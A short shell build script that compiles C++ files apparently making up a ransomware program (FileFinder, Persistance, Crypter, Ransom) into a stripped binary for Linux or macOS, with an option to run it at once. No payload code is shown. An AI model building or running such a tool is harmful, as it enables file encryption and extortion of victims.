rm a.out
if [[ $1 == "linux" ]]; then
	g++ FileFinder.cpp Persistance.cpp Crypter.cpp Arboresance.cpp Ransom.cpp main.cpp cryptopp/libcryptopp.a -static-libgcc -static-libstdc++ -s
fi
if [[ $1 == "mac" ]]; then
	g++ FileFinder.cpp Persistance.cpp Crypter.cpp Arboresance.cpp Ransom.cpp main.cpp cryptopp/libcryptopp.a -s
fi
if [[ $2 == "exec" ]]; then
	./a.out
fi